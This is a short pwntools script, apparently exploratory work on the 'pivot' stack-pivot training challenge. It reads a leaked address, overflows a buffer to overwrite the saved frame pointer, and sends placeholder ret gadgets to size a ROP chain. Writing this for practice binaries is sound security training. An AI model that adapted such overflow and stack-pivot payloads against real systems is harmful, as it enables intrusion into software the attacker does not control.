#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Observe the stack smatch with a
# avalutate the max ropchaine size

# break at the end of pwnme
gs='''
b *pwnme+180
c
'''
# Offset avant ecrasement de l'adresse de RBP
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

useless_func=elf.symbols['uselessFunction']
pwnme=elf.symbols['pwnme']
g_leave = pwnme+181
g_ret = pwnme+182

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
PL=p64(useless_func)
io.sendlineafter(b"> ",PL)

# Message 2 : send a ropchain with 4 "nop" gadgets to observation
PL =b"A"*offset
PL+=p64(leak)
PL+=p64(g_ret)
PL+=p64(g_ret)
PL+=p64(g_ret)
PL+=p64(g_ret)
io.sendlineafter(b"> ",PL)

io.interactive()

